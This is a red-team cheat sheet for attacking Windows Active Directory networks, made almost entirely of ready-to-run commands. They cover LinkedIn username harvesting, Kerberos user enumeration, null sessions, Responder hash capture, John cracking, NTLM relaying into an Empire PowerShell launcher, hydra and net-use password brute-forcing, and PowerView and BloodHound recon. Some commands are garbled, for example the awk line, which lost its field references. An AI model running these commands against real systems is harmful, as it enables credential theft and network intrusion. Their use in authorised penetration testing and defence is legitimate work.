# Red-Team and Infrastructure Assessments

## Domain User Enumeration

### Grab employee names from Linkedin

`theharvester -d blah.com -l 1000 -b linkedin`

### Change format to b.lah

`awk '=FS tolower(substr(,1,1)$NF)' linkedin-user-list.txt | awk '{ print   }'`

### Check usernames against AD:

Handy if you have generated a list from linkedin or a list of usernames.

`nmap -p 88 1.1.1.1 --script krb5-enum-users --script-args krb5-enum-users.realm="DOMAIN"`

username list is located at `/usr/local/share/nmap/nselib/data/usernames.lst` in Kali

### Null sessions

Still works on infra that was upgraded from 2k, 2k3.

`net use \\IP_ADDRESS\ipc$ "" /user:""`

Use enum4linux, enum or Dumpsec following the null session setup.

## Network Attacks 

### Responder

Grab NetNTLM hashes off the network

#### Without wpad:

`responder -I eth0`

#### With wpad:

`responder -I eth0 --wpad -b -f -F`

#### Filter logs from logs folder and remove machine accounts:

`sort -m *.txt | uniq -d | awk '!/\$/'

#### Cracking with John:

`john SMB-NTLMv2-Client-172.20.22.217.txt --wordlist=/root/passwords.txt`

Use hashcat on a more powerful box. This is only for easy wins.

#### NTLM Relaying 

`ntlmrelayx.py -tf targets.txt -c <insert Empire Powershell launcher>`

## Bruteforce domain passwords
### Using hydra

`hydra -L users.txt -p Password1 -m 'D' 172.20.11.55 smbnt -V`

### Bruteforce using net use

`@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL`

## Non-domain joined testing

When you have an initial set of compromised creds run these from a Virtual Machine to place foothold on network as domain user.

### Shell with domain user privileges
`C:\runas.exe /netonly /user:BLAHDOMAIN\blahuser “cmd.exe”`

### check dc: 
`nltest /dsgetdc:domain.local`

To change DC via registry to point at domain being tested:

HKEY_LOCAL_MACHINE
SYSTEM
CurrentControlSet
Services
Netlogon
Parameters
“SiteName“ > DC1.domain.com

### Create session for use with dumpsec
`net use \\10.0.0.1\ipc$ /user:domain.local\username password`

### Quick User lists and password policy enum

`net users /domain`

`net group /domain "Domain Admins"`

`net accounts /domain`

Note that the above commands do not work with runas. Below PowerView functions will work with runas.

### Powerview:

`. .\PowerView.ps1`

`Get-UserProperty -Properties samaccountname`

`Get-NetGroupMember`

`Get-DomainPolicy`

Search shares and files using Invoke-FileFinder and Invoke-ShareFinder

### BloodHound

Run locally on non-domain joined machine (remember to add target domain to registry):

``..\BloodHound.ps1``

``Invoke-BloodHound``

### SharpHound

SharpHound.exe --CollectionMethond All


